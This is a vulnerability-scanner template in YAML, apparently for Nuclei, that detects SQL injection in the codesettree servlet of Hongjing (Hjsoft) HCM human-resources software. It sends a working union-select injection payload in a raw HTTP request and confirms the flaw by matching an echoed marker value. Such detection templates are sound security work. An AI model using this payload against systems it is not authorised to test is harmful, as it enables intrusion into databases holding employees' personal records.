id: hjsoft-hcm-sql-injection
info:
  name: Hjsoft HCM codesettree SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Hongjing HCM is a comprehensive human resource management software product. This template detects an SQL injection vulnerability in the codesettree interface, allowing attackers to extract database information or potentially escalate privileges on the server.
  reference:
    - http://hjsoft.com.cn
http:
  - raw:
      - |
        GET /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=1%27%20union%20all%20select%20849754578,362789123+%d%20-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip, deflate
        Connection: close
    extractors:
      - type: regex
        name: sql_response
        part: body
        regex:
          - '<TreeNode id="849754578" text="849754578 (.*?)" xml="'
        internal: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<TreeNode id=\"849754578\""
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - '\d{10}'
